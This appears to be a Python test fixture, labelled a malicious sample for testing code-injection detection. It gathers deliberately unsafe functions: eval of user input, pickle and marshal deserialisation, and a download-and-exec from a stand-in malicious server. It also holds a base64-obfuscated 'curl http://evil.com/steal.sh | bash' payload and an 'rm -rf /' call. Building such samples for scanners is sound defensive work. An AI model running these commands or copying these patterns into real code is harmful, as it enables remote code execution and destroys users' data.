"""
MALICIOUS SAMPLE - Tests code injection detection
"""

import sys
import base64
import pickle
import marshal


def vulnerable_calculator():
    """Vulnerable calculator that allows code injection"""
    print("Simple Calculator")
    print("Enter mathematical expressions (e.g., 2+2, 10*5)")

    while True:
        try:
            user_input = input(">>> ")

            if user_input.lower() == "quit":
                break

            # CRITICAL VULNERABILITY: Direct eval of user input
            result = eval(user_input)  # This allows arbitrary code execution!
            print(f"Result: {result}")

        except Exception as e:
            print(f"Error: {e}")


def process_user_data(data):
    """Process serialized user data - DANGEROUS"""
    try:
        # CRITICAL: Unsafe pickle deserialization
        user_obj = pickle.loads(data)  # Can execute arbitrary code!
        return user_obj
    except:
        return None


def execute_remote_script():
    """Execute script from remote source"""
    import urllib.request

    # Download and execute remote Python script
    try:
        script_url = "http://malicious-server.com/payload.py"
        response = urllib.request.urlopen(script_url)
        remote_code = response.read().decode()

        # CRITICAL: Execute downloaded code
        exec(remote_code)  # Extremely dangerous!

    except:
        pass


def obfuscated_malware():
    """Obfuscated malware payload"""
    # Base64 encoded malicious command
    # Decodes to: os.system('curl http://evil.com/steal.sh | bash')
    encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3N0ZWFsLnNoIHwgYmFzaCcp"

    # Decode and execute
    decoded = base64.b64decode(encoded_payload)
    exec(decoded)


def dynamic_import_attack():
    """Dynamic import for loading malicious modules"""
    # User-controlled module loading
    module_name = sys.argv[1] if len(sys.argv) > 1 else "os"

    # CRITICAL: User controls what module gets imported
    malicious_module = __import__(module_name)

    # Execute dangerous functions
    if hasattr(malicious_module, "system"):
        malicious_module.system("rm -rf /")  # Delete everything!


def marshal_code_injection():
    """Code injection via marshal"""
    # Marshall can be used to serialize code objects
    dangerous_code = compile(
        "__import__('os').system('malicious_command')", "<string>", "exec"
    )
    serialized = marshal.dumps(dangerous_code)

    # Later, deserialize and execute
    deserialized_code = marshal.loads(serialized)
    exec(deserialized_code)  # Executes the malicious code


if __name__ == "__main__":
    vulnerable_calculator()
